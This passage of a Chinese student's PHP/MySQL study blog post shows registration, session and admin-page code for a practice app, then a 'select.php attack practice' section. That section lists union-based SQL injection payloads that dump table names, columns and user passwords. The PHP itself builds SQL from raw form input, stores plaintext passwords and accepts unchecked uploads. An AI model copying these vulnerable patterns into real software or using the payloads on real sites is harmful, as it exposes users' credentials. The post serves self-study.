class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">        `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">        `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">        `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">        PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">        )ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">		<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="注册界面zhuce-php"><a class="header-anchor" href="#注册界面zhuce-php">¶</a>注册界面zhuce.php</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"><span class="variable">$tupianname</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line">        <span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line">        <span class="comment">//密码验证</span></span><br><span class="line">        <span class="comment">//手机11位</span></span><br><span class="line">        <span class="comment">//文件上传jpg</span></span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> .</span><br><span class="line">			<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">			<span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	value(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianname</span>&#x27;);&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册失败&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="管理session-session-php"><a class="header-anchor" href="#管理session-session-php">¶</a>管理session  session.php</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;您已经成功登陆&lt;a href=&#x27;zhuxiao.php&#x27;&gt;点击注销&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;您无权访问,&lt;a href=&#x27;login.php&#x27;&gt;点击跳转登录页面&lt;/a&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="假装后台界面-youxi-php"><a class="header-anchor" href="#假装后台界面-youxi-php">¶</a>假装后台界面  youxi.php</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;session.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;游戏页面&lt;/h1&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;select.php&quot;</span>&gt;点击账号以及ID的对应关系&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;jsq.php&quot;</span>&gt;数字炸弹&lt;/a&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="PHP登录实战"><a class="header-anchor" href="#PHP登录实战">¶</a>PHP登录实战</h2>
+<ul>
+<li>
+<p><strong>实验七：综合作业（注册、登录、玩游戏）</strong></p>
+</li>
+<li>
+<p>用户登录以后可以直接打开多个链接，比如之前写入的用户查询页面，计算页面，可以将我们之前写入的都写进来</p>
+</li>
+<li>
+<p>思路：</p>
+<ul>
+<li>将session功能单独变成一个文件，在不同的页面里面引入即可</li>
+</ul>
+</li>
+</ul>
+<h2 id="select-php攻击实战（sql初次尝试）"><a class="header-anchor" href="#select-php攻击实战（sql初次尝试）">¶</a><strong>select.php</strong>攻击实战（sql初次尝试）</h2>
+<p>轮子：admin’ and ‘1’='1</p>
+<p>查询字段数量：<code>admin' order by 2--+'</code></p>
+<p>查询回显位置：<code>admin' union select 1,2--+'</code></p>
+<p>查询数据库库：<code>admin' union select database(),2--+'</code></p>
+<p>查询数据表：</p>
+<ul>
+<li><code>select table_name from information_schema.tables where table_schema=&quot;kkk&quot;;</code></li>
+</ul>
+<p>变形：</p>
+<ul>
+<li><code>-admin' union select table_name,2 from information_schema.tables where table_schema='kkk</code></li>
+</ul>
+<p>继续查询字段：</p>
+<ul>
+<li><code>-admin' union select group_concat(column_name),2 from information_schema.columns where table_name='kkk_tbl</code></li>
+</ul>
+<p>查询数据内容：</p>
+<p><code>-admin' union select group_concat(user,pass),2 from kkk_tbl where '1' ='1</code></p>
+<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
+<p>有点懵的一话。。。今天因为某些特殊原因有点心不在焉，所以任务的话回头再看看吧。php初级语法就学到这里，我看后面如果要深入学习php的话，<code>ThinkPHP</code>框架是绕不过去的。、</p>
+<p>不过就目前看，php还没掌握完全，下一步也没确定。。。。先不急这个</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        share
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://brocademaple.github.io/project/2024/07/11/CS_Notes/Database/PHP+MySQL_note_and_practice/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/CS-Notes/" rel="tag">CS Notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/Database/" rel="tag">Database</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/PHP/" rel="tag">PHP</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/project/2024/07/12/CS_Notes/Linux/%E3%80%90saveMyLinux%E3%80%91Linux%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            【saveMyLinux】Linux课程要点复习
+          
+        </div>
+      </a>
+    
+    
+      <a href="/project/2024/07/08/CS_Notes/Database/CS186-SQL3/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CS186 SQL3 Berkeley</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024
+        <i class="ri-heart-fill heart_icon"></i> brocademaple
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/project/"><img src="/images/ayer-side.svg" alt="BROCADEMAPLE"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/categories/notes">笔记库</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/tags/reading">阅读</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/project/aboutMe">自分</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/project/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/project/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/project/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/project/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/project/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/project/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/project/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/project/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/project/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/project/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=2010857169&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
